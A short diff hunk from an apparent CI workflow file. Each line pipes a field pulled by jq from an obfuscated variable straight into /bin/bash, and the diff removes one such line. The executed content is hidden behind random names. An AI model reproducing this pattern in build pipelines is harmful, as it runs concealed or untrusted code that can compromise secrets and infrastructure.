@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$opa2" | jq -r .ignpo8575 | /bin/bash
           printf '%s' "$mxqy00" | jq -r .zvalh85 | /bin/bash
           echo $cdnx9483 | jq -r .mfkjz6 | /bin/bash
-          echo $n64529 | jq -r .xwnuf5 | /bin/bash
           echo $ijws65 | jq -r .kztav13 | /bin/bash
           echo $xxuk7 | jq -r .dfbhi7 | /bin/bash
           echo $ac16400 | jq -r .ee59059 | /bin/bash
